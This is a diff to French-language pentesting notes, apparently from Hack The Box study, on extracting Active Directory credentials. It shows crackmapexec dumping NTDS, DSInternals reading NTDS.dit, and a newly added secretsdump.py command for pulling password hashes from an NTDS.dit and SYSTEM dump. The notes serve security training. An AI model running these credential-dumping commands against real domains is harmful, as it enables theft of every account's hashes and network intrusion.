@@ -63,7 +63,7 @@ crackmapexec smb $TARGET_IP -u $AD_USER -p $AD_PASSWORD --ntds
 ## Extraction des informations d'identification (credentials)
 
 ## Localement
-### Extraction des informations présentes dans NTDS.dit
+### Extraction des informations présentes dans NTDS.dit via DSInternals
 
 ```powershell-session
 # https://github.com/MichaelGrafnetter/DSInternals/releases/download/v4.12/DSInternals_v4.12.zip
@@ -75,3 +75,9 @@ PS C:\htb> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inla
 ```
 
 ### A distance
+#### Extraction des hash d'un dump NTDS.dit via secretsdump.py
+
+Prérequis : disposer d'NTDS.dit et du dump SYSTEM via 
+```shell-session
+secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
+```
